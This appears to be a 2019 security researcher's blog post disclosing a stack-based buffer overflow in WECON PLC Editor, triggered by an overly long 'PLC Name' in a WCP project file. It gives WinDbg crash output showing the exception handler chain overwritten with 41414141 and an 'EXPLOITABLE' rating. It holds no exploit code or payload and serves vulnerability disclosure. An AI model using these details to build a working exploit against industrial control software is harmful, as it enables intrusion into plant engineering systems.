---
layout: post
title: WECON PLC Editor
date: 2019-12-30
excerpt: "."
tags: [exploit]
comments: false
---
## WECON PLC Editor WCP File Parsing Stack-based Buffer Overflow
When reviewing [ZDI-19-1015](https://www.zerodayinitiative.com/advisories/ZDI-19-1015/), i found another attack vector that could be abused by providing an overly long 'PLC Name' in the Parameter Setting.
```
0:002> g
(1628.14fc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00300000 ebx=03b6a440 ecx=000000c8 edx=00000041 esi=03b6a440 edi=002fc8a4
eip=6cf44a05 esp=002fb970 ebp=002fd988 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
PLCParameterSetWnd!itlab::DList<tagMemoryCapacity>::erase+0x345:
6cf44a05 8810            mov     byte ptr [eax],dl          ds:0023:00300000=20
0:000> !exchain
002fda0c: PLCParameterSetWnd!pFuncProc+1a37 (6cf49007)
002fdb5c: mfc90u+21da9d (6edbda9d)
002fdbe4: mfc90u+21b4f9 (6edbb4f9)
002fdc4c: mfc90u+219cc9 (6edb9cc9)
002fdcec: USER32!_except_handler4+0 (75cc629b)
002fde8c: USER32!_except_handler4+0 (75cc629b)
002fdeec: USER32!_except_handler4+0 (75cc629b)
002fe024: mfc90u+225d6f (6edc5d6f)
002ff4b4: 41414141
Invalid exception stack at 41414141
0:000> !exploitable -v
HostMachine\HostUser
Executing Processor Architecture is x86
Debuggee is in User Mode
Debuggee is a live user mode debugging session on the local machine
Event Type: Exception
Exception Faulting Address: 0x300000
First Chance Exception Type: STATUS_ACCESS_VIOLATION (0xC0000005)
Exception Sub-Type: Write Access Violation

Exception Hash (Major/Minor): 0x1b4c404f.0x3b4c594f

Stack Trace:
PLCParameterSetWnd!itlab::DList<tagMemoryCapacity>::erase+0x345
PLCParameterSetWnd!itlab::DList<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > >::front+0x2180
Instruction Address: 0x000000006cf44a05

Description: User Mode Write AV
Short Description: WriteAV
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - User Mode Write AV starting at PLCParameterSetWnd!itlab::DList<tagMemoryCapacity>::erase+0x0000000000000345 (Hash=0x1b4c404f.0x3b4c594f)

User mode write access violations that are not near NULL are exploitable.
0:000> lmvm PLCParameterSetWnd
start    end        module name
6cf40000 6cf56000   PLCParameterSetWnd   (export symbols)       C:\Program Files\Wecon PLC Editor\PLCParameterSetWnd.Dll
    Loaded symbol image file: C:\Program Files\Wecon PLC Editor\PLCParameterSetWnd.Dll
    Image path: C:\Program Files\Wecon PLC Editor\PLCParameterSetWnd.Dll
    Image name: PLCParameterSetWnd.Dll
    Timestamp:        Thu Jan 24 01:27:37 2019 (5C4976F9)
    CheckSum:         0001AC92
    ImageSize:        00016000
    File version:     1.0.0.1
    Product version:  1.0.0.1
    File flags:       0 (Mask 3F)
    File OS:          4 Unknown Win32
    File type:        2.0 Dll
    File date:        00000000.00000000
    Translations:     0804.03a8
    CompanyName:      
    ProductName:      PLC Editor
    InternalName:     PLCParameterSetWnd.dll
    OriginalFilename: PLCParameterSetWnd.dll
    ProductVersion:   1.0.4
    FileVersion:      1.0.4
    FileDescription:  PLC编辑软件
    LegalCopyright:   TODO: (C) <公司名>。保留所有权利。

```
version 1.3.5_20190129 was tested.
